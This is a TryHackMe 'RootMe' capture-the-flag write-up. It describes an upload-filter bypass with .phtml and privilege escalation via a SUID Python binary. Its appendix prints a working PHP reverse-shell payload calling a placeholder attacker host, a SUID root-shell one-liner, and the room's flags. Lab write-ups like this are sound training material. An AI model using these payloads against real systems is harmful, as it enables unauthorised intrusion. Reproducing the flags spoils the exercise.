# Write-up – RootMe (TryHackMe)

## Objective and Scope

The objective of this assessment was to gain initial access to the provided Linux system and subsequently escalate privileges to root. The scope of the assessment was limited to the single target host provided within the TryHackMe room “RootMe”.

## Initial Enumeration

At the beginning of the assessment, a port scan was conducted to identify exposed network services. The scan revealed two open TCP ports. Port 80 was running an Apache web server with PHP support enabled. Port 22 was running an OpenSSH service. As no valid credentials were available for SSH access, the attack focused on the web service exposed on port 80.

## Web Enumeration

Further enumeration of the web server was performed by scanning for common directories. During this process, several paths were discovered. Of particular interest were the directories /panel/ and /uploads/. The /panel/ directory contained a file upload form. The /uploads/ directory was publicly accessible and had directory listing enabled, allowing uploaded files to be viewed directly via the browser.

## Initial Access

The file upload form in the /panel/ directory rejected files with the .php extension and returned the error message “PHP não é permitido!”. This indicated that the upload restriction was implemented as a simple extension-based filter. By using the alternative PHP extension .phtml, the filter was successfully bypassed.

A PHP file with the .phtml extension was uploaded and stored in the /uploads/ directory. Because the web server interpreted this file server-side, remote code execution was possible. A PHP reverse shell payload was used to establish a connection back to the attacker system. This resulted in an interactive shell running with the privileges of the www-data user.

## Post-Exploitation

After obtaining the reverse shell, basic enumeration was performed to confirm the current user context and access level. The shell was running as the www-data user, which has limited privileges on the system. The user flag was located and successfully read during this phase.

## Privilege Escalation

To escalate privileges, the system was examined for common misconfigurations. Files with the SUID permission bit set were enumerated. Among the listed binaries, the presence of /usr/bin/python2.7 with the SUID bit set stood out as highly unusual.

A scripting language interpreter with the SUID bit set allows arbitrary code execution with the privileges of the file owner. Since the Python binary was owned by root, it could be abused to execute commands with root privileges. This was confirmed by executing a Python command that returned a root user ID. A root shell was then spawned by invoking a privileged Bash shell through Python.

Root access was successfully obtained, and the root flag was retrieved from the root user’s home directory.

## Conclusion

The system was fully compromised due to two critical security issues. The first issue was an insecure file upload mechanism that allowed server-side code execution through a simple extension bypass. The second issue was a misconfiguration involving a SUID-enabled Python interpreter, which allowed immediate privilege escalation to root. Either issue alone represents a significant security risk; combined, they resulted in a complete system compromise.

## Flags

User flag
THM{y0u_g0t_a_sh3ll}
#
Root flag
THM{pr1v1l3g3_3sc4l4t10n}

# Technical Appendix

## Port Scan

The following nmap command was used to perform service and version detection and to store the results locally:

nmap -sC -sV -oA nmap/rootme 10.64.137.236

## Directory Enumeration

Directory enumeration against the web server was performed using gobuster with a common wordlist:

gobuster dir -u http://10.64.137.236/
 -w /usr/share/wordlists/dirb/common.txt

## Reverse Shell Setup

A netcat listener was started on the attacker system to receive the reverse shell connection:

nc -lvnp 4444

The following PHP payload was uploaded using the .phtml extension:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKBOXIP/4444 0>&1'"); ?>

## SUID Enumeration

Files with the SUID permission bit set were enumerated using the following command while suppressing permission errors:

find / -perm -4000 -type f 2>/dev/null

## Privilege Escalation

The SUID-enabled Python interpreter was first used to confirm execution as root:

/usr/bin/python2.7 -c 'import os; os.system("id")'

A root shell was then spawned using:

/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

## Root Flag Retrieval

After obtaining root access, the following commands were used:

whoami


cd /root


ls


cat root.txt

# Learnings

This challenge was designed to reinforce basic concepts and using the bread-and-butter-tools like nmap and gobuster. 
I learned that file upload functionality must always be analyzed in terms of storage location and execution context, and that extension-based filters are often insufficient and can be bypassed using alternative server-supported extensions such as .phtml.
I also learned to treat interpreters and shells as a distinct risk category during privilege escalation, as SUID permissions on such binaries effectively allow arbitrary code execution. 
Finally, the challenge highlighted that a lack of visible output does not necessarily indicate failure, especially when working with reverse shells, and that verifying privilege level using commands like id and whoami is essential.
I also reinforced my knowledge about using nmap, gobuster and trailing filepaths in Linux' filesystem (more fun than it may sound).
I tried to use the terminal as often as possible to get used to it more.

## Note
This write-up was created with the assistance of ChatGPT for explanation, structuring, and clarification of technical concepts. 
All commands and actions described were executed and verified manually by the author.
